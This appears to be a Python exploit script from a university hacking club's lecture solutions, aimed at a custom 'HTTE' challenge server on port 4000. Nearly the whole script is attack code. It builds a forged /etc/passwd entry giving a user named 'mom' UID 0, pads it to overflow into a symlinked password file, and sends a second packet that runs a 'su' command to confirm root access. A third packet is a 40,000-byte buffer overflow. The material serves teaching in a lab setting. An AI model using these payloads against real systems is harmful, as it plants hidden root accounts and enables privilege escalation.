import socket
import argparse
import sys
from concurrent.futures import ThreadPoolExecutor
import pdb
import commands
'''

OVERFLOWS INTO OTHER MEMORY SEGMENTS:


This a python client program for making and parsing HTTE request.
It is apart of the lectures of Rutgers Cyber Knights Computer
Hacking Club (R)
'''



'''
Solutions:

assumes you ran the following commands:

sudo mkdir /tmp/etc
sudo ln -s /bin/bash /tmp/etc/passwd


'''

__author__ = "Cyber Knights"


'''
socket with context manager
'''
class smartSocket:

    def __init__(self,family,type):
        self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    def __enter__(self):
        return self.socket

    def __exit__(self,type,value,traceback):
        self.socket.close()
        try:
            if issubclass(type,socket.error):
                print(value)
                sys.exit(1)
            if issubclass(type,TypeError):
                print(value)
                sys.exit(1)
        except TypeError:
            pass



if __name__ == "__main__":
    parser = argparse.ArgumentParser(
	description='HTTE Client'
    )
    parser.add_argument(
        '--ip',
        dest='ip',
        help='htte server ip'
    )

    args = parser.parse_args()
 #htte uses port 4000
    PORT = 4000
    HOST = args.ip
    def sktconnect(packet):
        global PORT
        global HOST
        with smartSocket(socket.AF_INET,socket.SOCK_STREAM) as s:
            s.connect((HOST,PORT))
            s.send(packet.encode('utf_8'))
            resp = s.recv(2000)
            return resp

    with ThreadPoolExecutor(max_workers=2) as executor:
        #grab hashed password
        p,hashpwd = commands.getstatusoutput('perl -e \'print crypt("mom","XX")\'')
        hashpwd = str(hashpwd)
        #create password entry
        entry = "mom:"+hashpwd+":0:0:" + "A"*79+":/root:/tmp/etc/passwd"

        #challenge 1
        TYPE = 'HTTE/1.0 GET\n'
        CODE = 'CODE: 4DEDS3\n'
        #challenge 1
        STATUS = "STATUS: "
        stat = "1"
        PAYLOAD = entry
        packet1 = TYPE+CODE+STATUS+stat+"\n"+PAYLOAD

        #verify challenge 1
        stat="TESTUSER"
        PAYLOAD = "su mom -c whoami > /var/mom.txt\t/var/mom.txt"
        packet2 = TYPE+CODE+STATUS+stat+"\n"+PAYLOAD
        #challenge 2
        stat = "2"
        PAYLOAD = "A"*40000
        packet3 = TYPE+CODE+STATUS+stat+"\n"+PAYLOAD

        futures = executor.map(sktconnect,[packet1,packet3,packet2])
        print("Waiting on Futures:")
        for resp in futures:
            print(resp)
